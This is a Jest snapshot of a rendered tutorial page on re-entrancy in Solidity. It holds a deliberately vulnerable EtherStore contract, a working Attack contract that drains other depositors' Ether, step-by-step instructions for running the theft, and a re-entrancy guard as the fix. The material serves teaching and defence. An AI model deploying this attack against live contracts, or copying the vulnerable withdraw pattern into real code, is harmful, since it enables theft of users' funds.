// Jest Snapshot v1, https://goo.gl/fbAQLP

exports[`it renders 1`] = `
<Example
  description="An example of re-entrancy attack in Solidity"
  html="<h3 id=\\"vulnerability\\">Vulnerability</h3>
<p>Let&#39;s say that contract <code>A</code> calls contract <code>B</code>.</p>
<p>Reentracy exploit allows <code>B</code> to call back into <code>A</code> before <code>A</code> finishes execution.</p>
<pre><code class=\\"language-solidity\\">pragma solidity ^0.6.0;

// EtherStore is a contract vulnerable to re-entrancy attack. Let&#39;s see why.

/*
1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).
5. Call Attack.collectEther to withdraw Ether from Attack

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    // Withdrawal limit = 1 ether / week
    uint public withdrawalLimit = 1 ether;
    mapping(address =&gt; uint) public lastWithdrawTime;
    mapping(address =&gt; uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] &gt;= _amount);
        require(_amount &lt;= withdrawalLimit);
        require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks);

        (bool sent, ) = msg.sender.call.value(_amount)(\\"\\");
        require(sent, \\"Failed to send Ether\\");

        balances[msg.sender] -= _amount;
        lastWithdrawTime[msg.sender] = now;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    function () external payable {
        if (address(etherStore).balance &gt;= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value &gt;= 1 ether);
        etherStore.deposit.value(1 ether)();
        etherStore.withdraw(1 ether);
    }

    function collectEther() public {
        (bool sent, ) = msg.sender.call.value(address(this).balance)(\\"\\");
        require(sent, \\"Failed to send Ether\\");
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
</code></pre>
<h3 id=\\"preventative-techniques\\">Preventative Techniques</h3>
<ul>
<li>Ensure all state changes happen before calling external contracts</li>
<li>Use function modifiers that prevent re-entrancy</li>
</ul>
<p>Here is a example of a re-entracy guard</p>
<pre><code class=\\"language-solidity\\">pragma solidity ^0.6.0;

contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, \\"No re-entrancy\\");
        locked = true;
        _;
        locked = false;
    }
}</code></pre>
"
  title="Re-Entrancy"
/>
`;
